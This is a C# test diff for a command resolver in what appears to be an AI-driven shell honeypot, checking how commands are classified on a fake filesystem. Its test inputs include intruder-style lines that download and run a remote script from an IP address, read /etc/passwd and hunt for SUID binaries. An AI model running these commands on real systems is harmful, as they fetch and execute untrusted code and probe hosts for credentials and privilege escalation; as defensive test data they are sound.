@@ -348,6 +348,71 @@ public class CommandResolverTests
         Assert.False(CommandResolver.IsModelFailureResponse("bash: nope: command not found"));
     }
 
+    [Theory]
+    [InlineData("cd /tmp || cd /run; wget http://45.81.234.64/10Gbins.sh; chmod 777 10Gbins.sh; sh 10Gbins.sh")]
+    [InlineData("ps -ef | grep '[Mm]iner'")]
+    [InlineData("cat /etc/passwd && uname -a")]
+    public void IsCompoundShellCommand_DetectsShellOperators(string command)
+    {
+        Assert.True(CommandResolver.IsCompoundShellCommand(command));
+    }
+
+    [Theory]
+    [InlineData("cd /tmp")]
+    [InlineData("uname -a")]
+    [InlineData("ls -la")]
+    public void IsCompoundShellCommand_IgnoresSimpleCommands(string command)
+    {
+        Assert.False(CommandResolver.IsCompoundShellCommand(command));
+    }
+
+    [Theory]
+    [InlineData("cd /tmp", "BuiltIn")]
+    [InlineData("pwd", "BuiltIn")]
+    [InlineData("uname -a", "BuiltIn")]
+    [InlineData("echo hello", "BuiltIn")]
+    [InlineData("/bin/./uname -a", "BuiltIn")]
+    [InlineData("cat /etc/passwd", "StaticDataset")]
+    [InlineData("ps", "StaticDataset")]
+    [InlineData("ls /var/log", "StaticDataset")]
+    [InlineData("scp /tmp/a remote:/tmp/a", "Blocked")]
+    public void ClassifyCommand_ShortCircuitsSimpleCommands(string command, string expectedPath)
+    {
+        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
+
+        var path = CommandResolver.ClassifyCommand(command, fs);
+
+        Assert.Equal(expectedPath, path.ToString());
+    }
+
+    [Theory]
+    [InlineData("cd /tmp || cd /run || cd /; wget http://45.81.234.64/10Gbins.sh; chmod 777 10Gbins.sh; sh 10Gbins.sh")]
+    [InlineData("ps -ef | grep '[Mm]iner'")]
+    [InlineData("cat /etc/passwd && uname -a")]
+    [InlineData("ls /var/log; cat /etc/passwd")]
+    [InlineData("wget http://example.com/a.sh -O /tmp/a.sh && sh /tmp/a.sh")]
+    [InlineData("find / -perm -4000 -type f 2>/dev/null")]
+    [InlineData("python3 -c 'import os; print(os.getuid())'")]
+    public void ClassifyCommand_PassesComplexOrUnknownCommandsToLlm(string command)
+    {
+        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
+
+        var path = CommandResolver.ClassifyCommand(command, fs);
+
+        Assert.Equal(CommandResolver.CommandResolutionPath.Llm, path);
+    }
+
+    [Fact]
+    public void ClassifyCommand_DoesNotMutateFilesystemForCdClassification()
+    {
+        var fs = FakeFileSystem.GetOrCreate(Guid.NewGuid().ToString("N"));
+
+        var path = CommandResolver.ClassifyCommand("cd /tmp", fs);
+
+        Assert.Equal(CommandResolver.CommandResolutionPath.BuiltIn, path);
+        Assert.Equal("/home/remote", fs.CurrentDirectory);
+    }
+
     [Fact]
     public void GenerateLocalFallbackResponse_ReturnsShellOutputForCompoundCommands()
     {
